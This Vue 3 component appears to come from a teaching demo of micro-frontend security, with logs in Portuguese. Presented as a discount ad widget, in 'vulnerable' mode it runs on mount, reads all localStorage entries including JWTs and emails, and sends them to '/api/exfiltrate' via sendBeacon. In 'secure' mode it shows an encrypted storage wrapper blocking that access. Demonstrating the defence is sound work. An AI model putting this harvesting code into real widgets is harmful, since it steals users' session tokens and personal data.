<script setup lang="ts">
import { onMounted, ref } from 'vue';
import type {} from './types/global.d.ts';

interface Props {
    mode: 'vulnerable' | 'secure';
    log: (type: string, message: string) => void;
}

const props = defineProps<Props>();

const dataCount = ref(0);
const isAttacking = ref(false);

async function executeVulnerableCode() {
    isAttacking.value = true;
    props.log('warning', '🚨 [Vue] Widget: Executando código de coleta de dados...');

    const payload: Record<string, string> = {};
    let count = 0;

    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
            const value = localStorage.getItem(key);
            if (value !== null) {
                payload[key] = value;
                count++;
            }
        }
    }

    dataCount.value = count;
    props.log('error', `🚨 [Vue] Widget: ${count} itens coletados do localStorage!`);

    Object.keys(payload).forEach(key => {
        const value = payload[key];
        const preview = value.length > 50 ? value.substring(0, 50) + '...' : value;

        if (key === 'jwt' || key === 'userId' || key === 'email') {
            props.log('error', `  🔴 CRÍTICO: ${key} = ${preview}`);
        } else {
            props.log('warning', `  🟡 ${key} = ${preview}`);
        }
    });

    props.log('error', '🚨 [Vue] Widget: Enviando dados via navigator.sendBeacon()...');

    const payloadStr = JSON.stringify(payload);
    const sent = navigator.sendBeacon('/api/exfiltrate', payloadStr);

    if (window.logTelemetry) {
        window.logTelemetry({
            type: 'exfiltration',
            source: 'Vue Widget',
            itemCount: count,
            bytes: payloadStr.length,
            ts: Date.now(),
            level: 'CRITICAL',
            preview: Object.keys(payload).slice(0, 5)
        }, 'critical');
    }

    if (sent) {
        props.log('error', `🚨 EXFILTRAÇÃO BEM-SUCEDIDA: ${count} itens enviados (${payloadStr.length} bytes)`);
    } else {
        props.log('warning', '⚠️ sendBeacon falhou');
    }

    setTimeout(() => {
        props.log('error', '💀 [Vue] ATAQUE CONCLUÍDO: Dados sensíveis comprometidos');
        isAttacking.value = false;
    }, 500);
}

async function executeSecureCode() {
    props.log('info', '[Vue] Widget: Executando código de análise...');

    const directItems: string[] = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
            directItems.push(key);
        }
    }

    props.log('success', `✅ [Vue] Widget: Encontrou ${directItems.length} itens no localStorage`);

    props.log('info', '[Vue] Widget: Tentando acessar dados protegidos...');

    try {
        const SecureStorage = window.SecureStorage;
        
        if (SecureStorage) {
            const fakeKey = 'dGVzdGluZ2Zha2VrZXkxMjM0NTY3ODkwMTIzNDU2Nzg5MA==';
            const fakeStore = new SecureStorage('mfe_dashboard', fakeKey, null, false);

            try {
                const jwt = await fakeStore.getItem('jwt');
                if (jwt) {
                    props.log('error', '🚨 FALHA DE SEGURANÇA: Dados acessados!');
                } else {
                    props.log('success', '✅ [Vue] Dados retornaram null (protegidos ou inexistentes)');
                }
            } catch (error) {
                props.log('success', `✅ [Vue] Acesso bloqueado: ${(error as Error).name}`);
            }

            props.log('success', '🛡️ [Vue] DEFESA EFETIVA: Dados sensíveis permanecem protegidos!');
        } else {
            props.log('warning', '[Vue] SecureStorage não disponível');
        }
    } catch (error) {
        props.log('success', '✅ [Vue] Acesso bloqueado: ' + (error as Error).message);
    }
}

onMounted(async () => {
    if (props.mode === 'vulnerable') {
        localStorage.setItem('widgetImpressionId', 'ad-12345');
        localStorage.setItem('weatherLocation', 'São Paulo');
        localStorage.setItem('weatherTemp', '27');
    }

    await new Promise(resolve => requestAnimationFrame(resolve));

    if (props.mode === 'vulnerable') {
        await executeVulnerableCode();
    } else {
        await executeSecureCode();
    }
});
</script>

<template>
    <div class="widget-container">
        <div class="vue-badge">
            <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
                <path d="M2 3h3.5L12 15l6.5-12H22L12 21 2 3m4.5 0H9L12 9l3-6h2.5l-5.5 10L6.5 3z"/>
            </svg>
            Vue 3
        </div>

        <div class="widget-promo">
            <h3 class="widget-title">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 6px; vertical-align: middle; color: #f59e0b;">
                    <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/>
                </svg>
                Oferta Relâmpago!
            </h3>
            <p class="widget-text">Ganhe 50% de desconto agora!</p>
            <button class="widget-btn">Ver Oferta</button>
        </div>

        <div class="widget-warning">
            <p>
                <strong>
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 4px; vertical-align: middle;">
                        <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
                        <line x1="12" y1="9" x2="12" y2="13"/>
                        <line x1="12" y1="17" x2="12.01" y2="17"/>
                    </svg>
                    Atenção:
                </strong> Este widget contém código de análise
                <span v-if="isAttacking" class="attack-indicator">
                    <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor" style="margin-left: 4px; vertical-align: middle;">
                        <circle cx="12" cy="12" r="10"/>
                    </svg>
                    ATIVO
                </span>
            </p>
        </div>
    </div>
</template>
